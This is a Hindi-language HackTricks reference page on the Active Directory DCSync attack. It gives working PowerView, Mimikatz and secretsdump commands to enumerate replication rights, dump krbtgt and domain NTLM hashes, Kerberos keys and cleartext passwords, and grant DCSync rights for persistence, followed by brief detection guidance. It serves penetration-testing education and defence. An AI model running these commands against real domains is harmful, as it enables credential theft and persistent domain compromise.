# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करके दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित **वर्कफ्लो को आसानी से बनाएं और स्वचालित करें**।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ AWS हैकिंग सीखें शून्य से नायक तक</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में शामिल हों या मुझे **Twitter** 🐦 पर **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग तकनीकें साझा करें।

</details>

## DCSync

**DCSync** अनुमति का तात्पर्य डोमेन स्वयं पर इन अनुमतियों का होना है: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** और **Replicating Directory Changes In Filtered Set**.

**DCSync के बारे में महत्वपूर्ण नोट्स:**

* **DCSync हमला एक डोमेन कंट्रोलर के व्यवहार का अनुकरण करता है और अन्य डोमेन कंट्रोलर्स से जानकारी की प्रतिकृति करने के लिए कहता है** डायरेक्टरी रेप्लिकेशन सर्विस रिमोट प्रोटोकॉल (MS-DRSR) का उपयोग करके। चूंकि MS-DRSR एक्टिव डायरेक्टरी का एक वैध और आवश्यक कार्य है, इसे बंद या अक्षम नहीं किया जा सकता है।
* डिफ़ॉल्ट रूप से केवल **डोमेन एडमिन्स, एंटरप्राइज एडमिन्स, एडमिनिस्ट्रेटर्स, और डोमेन कंट्रोलर्स** समूहों के पास आवश्यक विशेषाधिकार होते हैं।
* यदि किसी भी खाते के पासवर्ड उलटने योग्य एन्क्रिप्शन के साथ संग्रहीत किए गए हैं, तो Mimikatz में एक विकल्प उपलब्ध है जो पासवर्ड को स्पष्ट पाठ में वापस करने के लिए है

### सूचीकरण

`powerview` का उपयोग करके जांचें कि किसके पास ये अनुमतियां हैं:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### स्थानीय रूप से शोषण
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### दूरस्थ रूप से शोषण करें
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` तीन फाइलें उत्पन्न करता है:

* एक **NTLM हैशेज** के साथ
* एक **Kerberos कीज़** के साथ
*   एक [**प्रतिवर्ती एन्क्रिप्शन**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) सक्षम के साथ सेट किए गए किसी भी खातों के लिए NTDS से साफ़ पासवर्ड के साथ। प्रतिवर्ती एन्क्रिप्शन वाले उपयोगकर्ताओं को आप इस प्रकार प्राप्त कर सकते हैं:

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### पर्सिस्टेंस

यदि आप एक डोमेन एडमिन हैं, तो आप `powerview` की मदद से किसी भी उपयोगकर्ता को यह अनुमतियाँ प्रदान कर सकते हैं:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
फिर, आप **जांच सकते हैं कि क्या उपयोगकर्ता को सही ढंग से 3 विशेषाधिकार आवंटित किए गए थे** उन्हें आउटपुट में खोजकर (आपको "ObjectType" फील्ड के अंदर विशेषाधिकारों के नाम देखने में सक्षम होना चाहिए):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### उपाय

* सुरक्षा इवेंट आईडी 4662 (ऑब्जेक्ट के लिए ऑडिट पॉलिसी सक्षम होनी चाहिए) – एक ऑब्जेक्ट पर ऑपरेशन किया गया था
* सुरक्षा इवेंट आईडी 5136 (ऑब्जेक्ट के लिए ऑडिट पॉलिसी सक्षम होनी चाहिए) – एक डायरेक्टरी सेवा ऑब्जेक्ट में संशोधन किया गया था
* सुरक्षा इवेंट आईडी 4670 (ऑब्जेक्ट के लिए ऑडिट पॉलिसी सक्षम होनी चाहिए) – एक ऑब्जेक्ट पर अनुमतियां बदली गई थीं
* AD ACL स्कैनर - ACLs की रिपोर्ट्स बनाएं और तुलना करें। [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## संदर्भ

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) का उपयोग करके आसानी से **वर्कफ्लोज़ का निर्माण और ऑटोमेशन** करें, जो दुनिया के **सबसे उन्नत** समुदाय टूल्स द्वारा संचालित होते हैं।\
आज ही एक्सेस प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
